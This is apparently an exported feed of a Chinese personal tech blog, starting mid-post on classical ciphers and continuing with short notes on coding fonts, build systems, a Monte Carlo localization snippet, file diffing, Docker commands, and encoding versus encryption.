<p>同理，明文 <code>HELLO</code> 的密文为 <code>aabbbaabaaababbababbabbba</code>。</p>
<p>注意：虽然表中出现了 <code>A</code> <code>B</code> 两种字符，但培根密码的本质是二进制，即用两种不同的特征来加密明文，可以是字母的大小写或字体的样式等等。例如采用字母的大小写加密 <code>hello</code> 为 <code>GOod gOOd STUdY, dAY dAy UP, haHa</code>，其中大写代表 <code>A</code>，小写代表 <code>B</code>；类似的，也可以用粗体代表 <code>A</code>，正常代表 <code>B</code>，以字体的样式加密 <code>hello</code>。显然，培根密码所包含的信息可以和用于承载其的文章完全无关。</p>
<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，用来加解密的维吉尼亚表格如下所示：</p>
<p><img src="/images/vigenere.png" alt="维吉尼亚表格"></p>
<p>这一表格包括了 26 行字母表，每一行都由前一行向左偏移 1 位得到。<strong>行为明文行，列为密钥列，密文位于表格内。</strong></p>
<p>明文 <code>HELLOWORLD</code> 的加密结果如下：</p>
<ol>
<li>选择某一关键词作为密钥，如 <code>SECRET</code></li>
<li>对于明文第 1 个字母 <code>H</code>，对应密钥的第 1 个字母 <code>S</code>，于是使用表格中 <code>S</code>行字母表进行加密，得到密文第一个字母 <code>Z</code></li>
<li>以此类推，若密钥长度小于明文长度，则转到密钥第 1 个字母继续循环，最终得到密文 <code>ZINCSPGVNU</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>根据密钥第 1 个字母 <code>S</code> 所对应的 <code>S</code> 行字母表，发现密文第 1 个字母 <code>Z</code> 位于 <code>H</code> 列，因而明文第 1 个字母为 <code>H</code></li>
<li>依次类推</li>
</ol>
<p>显而易见，维吉尼亚密码相对于本文介绍的其他古典密码，很难利用穷举法破解。</p>
<h2 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h2><p>置换密码是将明文中的字母重新排列，字母本身不变，但其位置改变，即<strong>位置转换</strong>，典型的有栅栏密码等。</p>
<h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>栅栏密码（Rail fence cipher），又称篱笆密码，就是把要加密的明文分成 n 个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。</p>
<p>明文 <code>Hello World</code> 的加密过程如下：</p>
<ol>
<li>去掉空格：<code>HelloWorld</code></li>
<li>5 个一组：<code>Hello</code>，<code>World</code></li>
<li>取出每组第 1 个字母：<code>HW</code></li>
<li>取出每组第 2 个字母：<code>eo</code></li>
<li>以此类推</li>
<li>连在一起：<code>HWeolrllod</code></li>
<li>加上适当空格：<code>HWeol rllod</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>去掉空格：<code>HWeolrllod</code></li>
<li>分成 5 栏：<code>HW</code>、<code>eo</code>、<code>lr</code>、<code>ll</code>、<code>od</code></li>
<li>取出每栏第 1 个字母：<code>Hello</code></li>
<li>依次类推</li>
<li>连在一起：<code>HelloWorld</code></li>
<li>加上适当空格：<code>Hello World</code></li>
</ol>
<p>注意：这里栅栏的栏数取决于 n 的取值，一般而言，n 要整除字母数，n 不可能大于或等于字母数，当不知道 n 为多少时，可采用穷举法一个个试。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h3><p>准确来说，当铺密码不是一种加密方式而是一种编码方式，它是将中文和数字进行转化的算法，具体为：当前汉字有多少笔画出头，就转化成数字几。如 <code>王夫 井工 夫口 由中人</code> 即为 <code>67 84 70 123</code>。</p>
<h3 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h3><p>猪圈密码（Pigpen cipher），又称共济会密码（Masonic cipher），是一种以格子为基础的简单代换式密码。下图为猪圈密码中所用符号与 26 个英语字母之间的对应关系：</p>
<p><img src="/images/pigpen.png" alt="猪圈密码"></p>
<p>明文 <code>X MARKS THE SPOT</code> 的加密结果如下：</p>
<p><img src="/images/pigpen-eg.png" alt="猪圈密码例子"></p>
<h4 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h4><p>猪圈密码还有一种变形，即采用图片中字符位置一一对应的形式加解密，如 <code>FLAG</code> 可加密为 <code>OCJP</code>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>写代码应该用哪种字体</title>
    <url>/2018/09/23/code-font/</url>
    <content><![CDATA[<h2 id="等宽字体与比例字体"><a href="#等宽字体与比例字体" class="headerlink" title="等宽字体与比例字体"></a>等宽字体与比例字体</h2><p>等宽字体（Monospaced）是指字符宽度相同的电脑字体，与此相对，字符宽度不尽相同的电脑字体称为比例字体（Proportional）。一图胜千言，如下：</p>
<p><img src="/images/monospaced.PNG" alt="等宽字体与比例字体"></p>
<p>在早期的电脑中，由于技术的局限，无法进行字母宽度的比例调整，因此只能将每个字符都制作成一样的宽度，从而形成了等宽字体。在等宽字体中，字母 <code>i</code>，<code>j</code> 显得两侧余白较多，而字母 <code>w</code>，<code>m</code> 等的笔画显得相当拥挤。但是随着图形用户界面主流的更新和计算机技术的提高，处理比例字体的局限性得到了突破，因此现在排版上显得比较自然的比例字体的使用已经相当普及。这里所讨论的都是英文字体，对于中文字体而言，一般认为它们都是等宽的。<br>Windows 中常用的等宽字体为 <strong>Consolas</strong>；macOS 中常用的等宽字体为 <strong>Menlo</strong>；Linux 中常用的等宽字体为 <strong>Mono</strong>。</p>
<a id="more"></a>
<h2 id="衬线字体与非衬线字体"><a href="#衬线字体与非衬线字体" class="headerlink" title="衬线字体与非衬线字体"></a>衬线字体与非衬线字体</h2><p>顾名思义，衬线体（Serif）和无衬线体（Sans-Serif）的区别就在于有无<strong>衬线</strong>，而衬线则指的是字形笔画末端的装饰细节部分。一图胜千言，如下：</p>
<p><img src="/images/serif.PNG" alt="衬线字体与非衬线字体"></p>
<p>这里所讨论的都是英文字体，对于简体中文字体而言，习惯性称衬线字体为<strong>宋体</strong>，非衬线字体为<strong>黑体</strong>，如下：</p>
<p><img src="/images/song-hei.png" alt="宋体与黑体"></p>
<p>衬线字体常用于印刷业，而且特别适用于长篇文章段落；非衬线字体简洁大方，适用于广告、标志、牌子等短句。另外，系统、程序和网页中的字体也几乎都是非衬线字体，即使是很长的段落，这是因为显示器分辨率低，字体不能减小，如果用衬线字体，那些边边角角就很难用像素显示清楚，结果反而不利于阅读。<br>Google 在 2015 年就将其原本的衬线体 Logo 换成了无衬线体 Logo:</p>
<p><img src="/images/google.gif" alt="Google Logo 变化"></p>
<p>我们在写 Word 文档时，常用的英文衬线字体就是 <strong>Times New Roman</strong>；而在做 PPT 时，个人倾向于使用非衬线字体<strong>微软雅黑</strong>。</p>
<h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><p>写代码应该使用的字体对于衬线或非衬线要求不大，但强烈建议使用等宽字体，这样可以便于代码对齐，因为比例字体的宽度不定，这会对代码对齐造成极大的困难。另外，还应该对特殊字符有较高的辨识度，比如 <code>I</code>（大写 <code>i</code>）、<code>l</code>（小写 <code>L</code>）、<code>1</code>（数字 <code>1</code>），<code>0</code>（数字 <code>0</code>）、<code>O</code>（大写 <code>o</code>） 等。最后，中文字符的宽度应该严格是英文字符宽度的 2 倍，在某些时候，你会发现这很有用。</p>
<p>基于以上，个人倾向于使用 be5invis 开发的 <a href="https://github.com/be5invis/Sarasa-Gothic">Sarasa-Gothic（更纱黑体）</a> 系列字体，它的前身便是 Inziu Iosevka 系列字体，现在已经迁移至 Sarasa-Gothic，推荐使用其中的 <strong>Sarasa Term SC</strong> 型字体。此外，这一系列字体都是开源免费的。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>在下载某些字体时，可能会遇到相关术语，如下：</p>
<ul>
<li>mono：即 Monospaced，等宽字体</li>
<li>sans：即 Sans-Serif，无衬线体</li>
<li>gothic：哥特体，即无衬线体</li>
<li>bold：粗体</li>
<li>italic：斜体</li>
<li>bolditalic：加粗斜体</li>
<li>regular：常规体</li>
<li>sc：即 Simplified Chinese，简体中文</li>
<li>tc：即 Traditional Chinese，繁体中文</li>
<li>cl：即 Classical Literature，《康熙字典》字形</li>
<li>j：即 Japanese，日文</li>
<li>ligature：连体字符，举例来说，会把 <code>!=</code> 变成 <code>≠</code></li>
</ul>
<h2 id="配色"><a href="#配色" class="headerlink" title="配色"></a>配色</h2><p>关于代码配色，就真是个“仁者见仁，智者见智”的问题了，个人要求满足以下两点：</p>
<ol>
<li>采用黑色背景</li>
<li>官网提供多种编辑器的支持</li>
</ol>
<p>综上，个人倾向于使用 <a href="https://draculatheme.com/">Dracula</a> 。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>编译与构建</title>
    <url>/2018/07/15/compile-build/</url>
    <content><![CDATA[<p>在一般意义上而言，本文 <strong>编译与构建</strong> 的内容适用于 <strong>编译型语言</strong> 。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><strong>编译（compile）</strong>，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为<strong>编译器（compiler）</strong>。但要注意，编译器在同一时刻只能转换一个编译单元，所谓<strong>编译单元</strong>是指单个的源文件。</p>
<p>编译器一般由相应的编程语言提供。</p>
<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><p>程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标文件，而这个工具就是<strong>构建系统（build system）</strong>，构建系统所作的就是<strong>构建（build）</strong>，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。</p>
<p>现在的很多构建系统也包含了<strong>包管理器（package manager）</strong>的功能，用以解决项目依赖的问题。</p>
<a id="more"></a>

<h2 id="另外的"><a href="#另外的" class="headerlink" title="另外的"></a>另外的</h2><p>在 Linux 中 编译 C/C++，使用最广的编译器是 <strong><a href="https://gcc.gnu.org/">GCC</a></strong> ，即 GNU Compiler Collection（GNU 编译器套件），GCC 的原名为 GNU C Compiler（GNU C 语言编译器），因为在后续逐渐支持了 C++、Java 等更多的语言，所以更改了其缩写的含义。有关 GCC 更详细的信息可参考 <a href="/2019/04/18/gcc/" title="GCC 小记">GCC 小记</a>。</p>
<p>除此之外，另一个 C/C++ 编译器 <strong><a href="http://clang.llvm.org/">Clang</a></strong> 旨在替代 GCC。</p>
<p>在 Linux 中使用最广的构建系统是 <strong><a href="https://www.gnu.org/software/make/">GNU make</a></strong> ，它会读取 <strong>Makefile</strong> 文件中的配置信息来完成构建，有关 Makefile 文件更详细的信息可参考 <a href="/2019/04/18/makefile/" title="Makefile小记">Makefile小记</a>。</p>
<p>Java 世界中使用最广的构建系统是 <strong><a href="https://maven.apache.org/">Maven</a></strong> ，而在 Android Studio 中则使用到了后起之秀 <strong><a href="https://gradle.org/">Gradle</a></strong> 。</p>
<p>C 语言从源代码到可执行文件的过程依次经过了<strong>预处理</strong>、<strong>编译</strong>、<strong>链接</strong>这几个步骤，即我们常说的 GCC 是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。</p>
<p>普通编译是生成当前系统平台下的目标文件，而<strong>交叉编译</strong>是指生成另一个系统平台下的目标文件。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Udacity CS373:无人驾驶汽车编程学习笔记一</title>
    <url>/2017/12/14/cs373-1/</url>
    <content><![CDATA[<h2 id="一：定位"><a href="#一：定位" class="headerlink" title="一：定位"></a>一：定位</h2><p>蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。<br>基于一维的蒙特卡罗定位程序如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">world = [<span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">measurements = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">motions = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">pHit = <span class="number">0.6</span></span><br><span class="line">pMiss = <span class="number">0.2</span></span><br><span class="line">pExact = <span class="number">0.8</span></span><br><span class="line">pOvershoot = <span class="number">0.1</span></span><br><span class="line">pUndershoot = <span class="number">0.1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sense</span>(<span class="params">p, Z</span>):</span></span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        hit = (Z == world[i])</span><br><span class="line">        q.append(p[i] * (hit * pHit + (<span class="number">1</span>-hit) * pMiss))</span><br><span class="line">    s = <span class="built_in">sum</span>(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(p)):</span><br><span class="line">        q[i] = q[i]/s</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">p, U</span>):</span></span><br><span class="line">    q= []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        s = pExact * p[(i-U) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pOvershoot * p[(i-U-<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pUndershoot * p[(i-U+<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(measurements)):</span><br><span class="line">    p = sense(p, measurements[k])</span><br><span class="line">    p = move(p, motions[k])</span><br><span class="line">    <span class="built_in">print</span> p</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CS373</tag>
        <tag>无人驾驶</tag>
      </tags>
  </entry>
  <entry>
    <title>curl wget</title>
    <url>/2018/09/19/curl-wget/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>如何比较两个文件之间的差异</title>
    <url>/2018/10/19/diff/</url>
    <content><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在Windows下，可以使用系统自带的<code>fc</code>命令（即file compare的缩写），比如<code>fc game_old.js game_new.js</code>，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正在比较文件 game_old.js 和 GAME_NEW.JS</span><br><span class="line">***** game_old.js</span><br><span class="line">KEY_CODES &#x3D; &#123;</span><br><span class="line">  32: &#39;space&#39;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">KEY_CODES &#x3D; &#123;</span><br><span class="line">  13: &#39;enter&#39;,</span><br><span class="line">  32: &#39;space&#39;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line">  37: &#39;left&#39;,</span><br><span class="line">  38: &#39;up&#39;,</span><br><span class="line">  39: &#39;right&#39;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">  37: &#39;left&#39;,</span><br><span class="line">  39: &#39;right&#39;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.up) &#123;</span><br><span class="line">      var rad &#x3D; ((this.rot-90) * Math.PI)&#x2F;180;</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.spacr) &#123;</span><br><span class="line">      var rad &#x3D; ((this.rot-90) * Math.PI)&#x2F;180;</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>
<p>可见，<code>fc</code>命令会把两个文件中不同的片段显示出来，并分别标注属于哪个文件。输入<code>fc /?</code>可以查看<code>fc</code>命令的更多参数。</p>
<a id="more"></a>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在Linux下，可以使用系统自带的<code>diff</code>命令（即difference的缩写），它要比Windows中的<code>fc</code>命令更为强大，比如<code>diff -u game_old.js game_new.js</code>，其中<code>-u</code>参数表示使用标准区别格式，这将使输出内容更容易阅读，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--- game_old.js 2018-10-19 11:31:58.054834600 +0800</span><br><span class="line">+++ game_new.js 2018-10-19 11:32:19.667759500 +0800</span><br><span class="line">@@ -4,9 +4,9 @@</span><br><span class="line"> &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line"> KEY_CODES &#x3D; &#123;</span><br><span class="line">+  13: &#39;enter&#39;,</span><br><span class="line">   32: &#39;space&#39;,</span><br><span class="line">   37: &#39;left&#39;,</span><br><span class="line">-  38: &#39;up&#39;,</span><br><span class="line">   39: &#39;right&#39;,</span><br><span class="line">   40: &#39;down&#39;,</span><br><span class="line">   70: &#39;f&#39;,</span><br><span class="line">@@ -392,7 +392,7 @@</span><br><span class="line">       this.vel.rot &#x3D; 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">-    if (KEY_STATUS.up) &#123;</span><br><span class="line">+    if (KEY_STATUS.spacr) &#123;</span><br><span class="line">       var rad &#x3D; ((this.rot-90) * Math.PI)&#x2F;180;</span><br><span class="line">       this.acc.x &#x3D; 0.5 * Math.cos(rad);</span><br><span class="line">       this.acc.y &#x3D; 0.5 * Math.sin(rad);</span><br></pre></td></tr></table></figure>
<p>可见，<code>diff</code>命令的输出结果更加丰富，开始它展示了正在比较的2个文件，紧接着它显示了不同之处，其中<code>-</code>开始的段落代表只存在于前一个文件中，不存在于后一个文件中，同理，<code>+</code>开始的段落代表只存在于后一个文件中，不存在于前一个文件中，除此之外的所有段落代表共同存在于2个文件中。一般而言，我们将前一个文件表示为旧文件，后一个文件表示为新文件。输入<code>diff --help</code>可以查看<code>diff</code>命令的更多参数。</p>
<h2 id="图形化程序"><a href="#图形化程序" class="headerlink" title="图形化程序"></a>图形化程序</h2><p>或许使用像前面所述的命令行程序观察结果不是很方便，因此有些人可能会倾向于使用图形化程序，而<a href="http://meldmerge.org/">Meld</a>就是个不错的选择，它开源且跨平台，可用来可视化的观察文件之间的差异。使用Meld比较两文件差异的结果如下：<img src="/images/meld.PNG" alt="Meld结果">可见，Meld用高亮显示文件之间的差异，同时它还提供了前往上一个/下一个差异的按钮，方便用户快速跳转。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10的传递优化</title>
    <url>/2018/07/16/delivery-optimization/</url>
    <content><![CDATA[<p>为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即<a href="https://privacy.microsoft.com/zh-CN/windows-10-windows-update-delivery-optimization"><strong>传递优化</strong></a>(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。<br>开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>数字货币中的相关术语</title>
    <url>/2018/12/16/digital-currency/</url>
    <content><![CDATA[<h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><h2 id="矿池"><a href="#矿池" class="headerlink" title="矿池"></a>矿池</h2><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Docker 入坑指南</title>
    <url>/2018/08/31/docker/</url>
    <content><![CDATA[<p>Docker 是一种基于 Linux 的容器化技术，类似于轻量的虚拟机。它采用 <strong>C/S</strong> 架构，使用 Go 语言开发。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Docker 分为 2 个版本：<strong>社区版</strong>（Community Edition, CE）和<strong>企业版</strong>（Enterprise Edition, EE），顾名思义，企业版是收费的。</p>
<p>针对 macOS 10.10.3 和 Windows 10，Docker 还推出了 <a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a>，Docker Desktop 又分为 2 个渠道（channel），<strong>稳定渠道</strong>（Stable）和<strong>抢先渠道</strong>（Edge），需要注意的是，Docker Desktop 对系统是有要求的，例如，针对 Win10 的 <a href="https://store.docker.com/editions/community/docker-ce-desktop-windows">Docker for Windows</a> 因为要用到 Hyper-V 虚拟机，所以要求系统是 64 位专业版或企业版并开启 Hyper-V 功能。</p>
<p>针对老版本的 Windows 或 macOS，可以使用 <a href="https://docs.docker.com/toolbox/overview/">Docker Toolbox</a>，它会附带安装一个 VirtualBox 虚拟机。</p>
<p>使用 <code>docker version</code> 可以查看 docker 版本号，使用 <code>docker info</code> 可以查看 docker 详细信息，直接输入 <code>docker</code> 可以查看 docker 相关命令。</p>
<a id="more"></a>
<h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p><strong>镜像</strong>（image）文件可以用来生成容器实例，其类似于在虚拟机中安装操作系统时所使用的 ISO 镜像。</p>
<p>镜像文件可以包含一个标签（tag），即版本号。</p>
<p>你可以使用远程仓库中别人制作好的镜像文件，也可以自己制作镜像文件。要制作镜像文件就要编写 <strong>Dockerfile</strong> 文件，其类似于 Makefile 文件。</p>
<p>与 image 相关的常用命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出本机的所有image文件</span></span><br><span class="line">docker image ls</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的image文件</span></span><br><span class="line">docker image rm &lt;image-name&gt;</span><br><span class="line">docker rmi &lt;image-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的image文件从远程仓库拉取到本地</span></span><br><span class="line">docker image pull &lt;image-name&gt;[:tag]</span><br><span class="line">docker pull &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件</span></span><br><span class="line"><span class="comment"># 若不指定tag，则默认的标签为latest</span></span><br><span class="line">docker image build -t demo:0.0.1 .</span><br><span class="line">docker build -t demo:0.0.1 .</span><br></pre></td></tr></table></figure>

<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>镜像文件生成的容器（container）实例，本身也是一个文件，称为<strong>容器文件</strong>。当关闭容器时，并不会删除容器文件，只是容器停止运行而已。</p>
<p>类似于在虚拟机中安装的操作系统，其本身会在硬盘中创建一系列文件，当关闭操作系统时，相应的文件并不会删除。</p>
<p>与 container 相关的常用命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从指定的image文件生成一个正在运行的容器实例，</span></span><br><span class="line"><span class="comment"># 若本地没有指定的image文件，会从远程仓库中自动拉取下来并运行</span></span><br><span class="line"><span class="comment"># 使用参数`-it`返回容器实例的终端</span></span><br><span class="line"><span class="comment"># 使用参数`--rm`在关闭容器后删除容器文件</span></span><br><span class="line"><span class="comment"># 使用参数`-p`将容器内端口映射到主机端口</span></span><br><span class="line"><span class="comment"># 使用参数`-v`将主机目录和容器内目录进行绑定</span></span><br><span class="line">docker container run &lt;image-name&gt;[:tag]</span><br><span class="line">docker run &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机正在运行的容器，使用参数`-all`列出所有容器文件</span></span><br><span class="line">docker container ls</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的容器文件</span></span><br><span class="line">docker container rm &lt;container-id&gt;</span><br><span class="line">docker rm &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动指定的容器实例</span></span><br><span class="line">docker container start &lt;container-id&gt;</span><br><span class="line">docker start &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启指定的容器实例</span></span><br><span class="line">docker container restart &lt;container-id&gt;</span><br><span class="line">docker restart &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭指定的容器实例</span></span><br><span class="line">docker container stop &lt;container-id&gt;</span><br><span class="line">docker stop &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制关闭指定的容器实例</span></span><br><span class="line">docker container <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line">docker <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line">docker cp</span><br><span class="line">docker attach</span><br><span class="line">docker <span class="built_in">exec</span>（重要）</span><br></pre></td></tr></table></figure>

<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p><strong>仓库</strong>（repository）是不同标签的镜像的集合，注册处（registry）又是不同仓库的集合，Docker 的官方注册处是 <a href="https://hub.docker.com/">Docker Hub</a>，类似于 GitHub。使用 <code>docker login</code> 可以登录到自己在 Docker Hub 上注册的帐号。值得注意的是，国内访问 Docker Hub 速度较慢，建议设置代理或使用国内镜像站。一般来说，国内镜像站只包含流行的公有镜像，私有镜像仍需要从 Docker Hub 中拉取。</p>
<p>与 repository 相关的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从Docker Hub中搜索某个 image</span></span><br><span class="line">docker search [image-name]</span><br></pre></td></tr></table></figure>

<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>阿里云镜像加速</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="Drive-has-not-been-shared"><a href="#Drive-has-not-been-shared" class="headerlink" title="Drive has not been shared"></a>Drive has not been shared</h3><p>在 Windows 10 上启动 Docker 可能会遇到 <code>Unhandled exception: Drive has not been shared</code> 这样的问题，可以通过勾选 Settings ——&gt; Resources ——&gt; FILE SHARING 中相应的磁盘以解决此问题。若提示 <code>Cannot change shared directories</code>，则你可能需要重启 Docker 后再次进行上述操作。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>编码与加密</title>
    <url>/2018/05/08/encode-encrypt/</url>
    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>编码（encode）是信息从一种形式或格式转换为另一种形式的过程。相应的，解码（decode）是编码的逆过程。</p>
<p>常见的编码算法有 ASCII 编码、URL 编码、HTML 编码、Base64 编码等。</p>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>加密（encryption）是将明文信息改变为难以读取的密文内容，使之不可读。只有拥有解密方法的对象，经由解密（decryption）过程，才能将密文还原为正常可读的内容。</p>
<p>现代密码学中的加密算法可以分为两类：<strong>对称加密（Symmetric encryption）</strong>和<strong>非对称加密（Asymmetric encryption）</strong>。</p>
<p>对称加密就是将信息使用一个密钥进行加密，解密时使用同样的密钥，同样的算法进行解密。</p>
<p>非对称加密，又称公开密钥加密，是加密和解密使用不同密钥的算法，一个是公开密钥，一个是私有密钥，一个用作加密的时候，另一个则用作解密，虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个。在通信中，加密通常使用的是对方的公钥，当对方收到密文后可以使用自己的私钥解密。如果加密使用的是自己的私钥，则密文可由任何人解密，由此可验证该文件必定出自该用户，这亦称作<strong>数字签名（Digital Signature）</strong>。</p>
<p>常见的对称加密算法有 DES、3DES、AES、RC5 等。</p>
<p>常见的非对称加密算法有 RSA、DSA、ECDSA、Elgamal 等。</p>
<p>非对称加密在计算上相当复杂，速度远远比不上对称加密，因此，在一般实际情况下，往往通过非对称加密来随机创建临时的对称密钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据。</p>
<p>加密算法实质上是<strong>密码算法</strong>中的一种，另一种则是<strong>哈希（hash）算法</strong>。</p>
<a id="more"></a>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>哈希算法，又称为散列算法，就是把任意长度的输入变换成固定长度的输出，是一种不可逆的算法，也就是说不能通过密文（即哈希值）反算出明文，这是一种单向加密的算法。另外，多个不同的明文可能会得到同一个密文，因为值域是有限的，这种情况称为<strong>冲突</strong>。一个优秀的哈希算法会尽量的减少这种冲突性。</p>
